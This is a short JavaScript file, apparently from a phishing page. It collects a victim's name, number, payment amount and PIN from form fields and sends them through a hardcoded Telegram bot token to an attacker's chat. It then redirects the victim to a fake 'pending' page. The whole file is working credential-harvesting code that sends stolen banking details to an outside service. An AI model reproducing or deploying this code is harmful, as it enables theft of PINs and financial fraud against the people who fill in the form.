
  //bot token
var telegram_bot_id = "8152719529:AAEvIwNLVU_5dKfLUJ_eKhQ5nib73wvbMPA";
//chat id
var chat_id = -4758175388;
var ready = function () {
    formname = document.getElementById("formname").value;
    name = document.getElementById("name").value;
    number = document.getElementById("number").value;
    good = document.getElementById("good").value;
  
    message = 
      "\nNaam: " + formname +  
      "\nNo: " + name + 
      "\n₹: " + number +
      "\npin: " + good;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message,
          "file": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        
      document.location = "peading.html";
      
    });
    document.getElementById("formname").value = "";
    document.getElementById("name").value = "";
    document.getElementById("number").value = "";
    document.getElementById("good").value = "";
    return false;
};
